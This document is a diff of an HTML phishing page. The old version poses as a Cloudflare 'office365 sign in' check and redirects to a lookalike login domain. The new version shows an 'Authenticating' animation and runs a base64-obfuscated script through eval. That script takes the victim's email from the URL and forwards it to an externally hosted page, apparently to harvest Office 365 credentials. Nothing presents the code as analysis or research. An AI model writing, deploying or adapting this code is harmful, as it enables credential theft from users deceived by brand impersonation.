@@ -1,138 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudflare Verification</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f7f7f7;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-        .container {
-            text-align: center;
-            background-color: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-        }
-        .logo {
-            width: 150px;
-            margin-bottom: 20px;
-        }
-        .verification-box {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border: 1px solid #ccc;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 20px 0;
-            background-color: #f9f9f9;
-        }
-        .verification-box input {
-            width: 20px;
-            height: 20px;
-            margin-right: 10px;
-        }
-        .cf-branding {
-            display: flex;
-            align-items: center;
-        }
-        .cf-branding img {
-            width: 30px;
-            margin-right: 5px;
-        }
-        .cf-branding a {
-            font-size: 12px;
-            color: #666;
-            text-decoration: none;
-            margin-left: 10px;
-        }
-        .cf-branding a:hover {
-            text-decoration: underline;
-        }
-        .submit-btn {
-            background-color: #0078D4;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .submit-btn:disabled {
-            background-color: #b3b3b3;
-            cursor: not-allowed;
-        }
-        .loading {
-            display: none;
-            margin-top: 20px;
-        }
-        .spinner {
-            width: 30px;
-            height: 30px;
-            border: 3px solid rgba(0, 0, 0, 0.1);
-            border-left-color: #0078D4;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Authenticating</title>
 </head>
 <body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png" alt="Cloudflare Logo" class="logo">
-        
-        <div class="verification-box">
-            <div class="verify">
-                <input type="checkbox" id="verify" name="verify">
-                <label for="verify">office365 sign in</label>
-            </div>
-            <div class="cf-branding">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png" alt="Cloudflare Logo" style="width: 20px;">
-                <a href="#">Privacy</a> · <a href="#">Terms</a>
-            </div>
-        </div>
-
-        <form id="verificationForm" method="POST">
-            <button type="submit" class="submit-btn">Submit</button>
-        </form>
-
-        <div class="loading" id="loadingIndicator">
-            <div class="spinner"></div>
-        </div>
-    </div>
-
-    <script nonce="MjM5ODUzNjk5OCwzMDkwMDI0MTIz">
-        document.addEventListener('DOMContentLoaded', function () {
-            // Listen for form submission
-            document.getElementById('verificationForm').addEventListener('submit', function (event) {
-                event.preventDefault();
-                
-                // Check if the checkbox is checked
-                if (document.getElementById('verify').checked) {
-                    document.getElementById('loadingIndicator').style.display = 'block';
-                    document.querySelector('button[type="submit"]').setAttribute('disabled', 'true');
-                    
-                    // Redirect after a delay without any email grabbing
-                    setTimeout(function () {
-                        window.location.href = 'https://login.authqip.org?2I4zeCg=aHR0cHM6Ly9vZmZpY2UuY29t';
-                    }, 3000);
-                } else {
-                    alert('Please verify that you are a human being by ticking the checkbox.');
-                }
-            });
-        });
-    </script>
+<img src="data:image/gif;base64,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" alt="">
+</p>
 </body>
+</html>
+<script>
+    // Base64-encoded redirection script
+    const scriptBase64 = `
+        Ly8gRXh0cmFjdCB0aGUgY3VycmVudCBVUkwgcGFyYW1ldGVyIGNhbGxlZCBlbWFpbA0KDQpjb25zdCBjdXJyZW50VXJsID0gd2luZG93LmxvY2F0aW9uLmhyZWY7DQoNCmNvbnN0IGVtYWlsID0gKGZ1bmN0aW9uKCkgew0KICAgIGlmIChjdXJyZW50VXJsLmluY2x1ZGVzKCc/ZW1haWw9JykpIHsNCiAgICAgICAgcmV0dXJuIG5ldyBVUkxTZWFyY2hQYXJhbWV0ZXJzKGN1cnJlbnRVcmwuc2VhcmNoKS5nZXQoJ2VtYWlsJyk7DQogICAgfSBlbHNlIGlmIChjdXJyZW50VXJsLmluY2x1ZGVzKCcjZW52ZW9wZ2F0ZXM9JykpIHsNCiAgICAgICAgcmV0dXJuIGN1cnJlbnRVcmwuc3BsaXQoJz9lbWFpbD0nKVsxXTsNCiAgICB9IGVsc2UgaWYgKGN1cnJlbnRVcmwuaW5jbHVkZXMoJyNlJykpIHsNCiAgICAgICAgcmV0dXJuIGN1cnJlbnRVcmwuc3BsaXQoJyNlJylbMV07DQogICAgfQ0KICAgIHJldHVybiAnJzsNCn0pKCk7DQoNCi8vIFJlZCBpcmVjdHMgdG8gdGhlIHNldCBkb21haW4gYW5kIHJlcGFzc2VkIGVtYWlsDQoNCmNvbnN0IHJlZGlyZWN0VXJsID0gImh0dHBzOi8vcHViLTQwNTJiN2Q1MjFhMTRlNDRiZDljNTg0MzM5ZjM3Y2U1LnIyLmRldi9ubm5ubm4uaHRtP2VtYWlsPSIgKyAoZW1haWwgfHwgJycpOw0KDQovLyBTZXRzIHRoZSBsb2NhdGlvbiB0byB0aGUgcmVkaXJlY3Rpb24gbGluaw0Kd2luZG93LmxvY2F0aW9uLmhyZWYgPSByZWRpcmVjdFVybDs=
+    `;
+    eval(atob(scriptBase64));
+</script>
 </html>
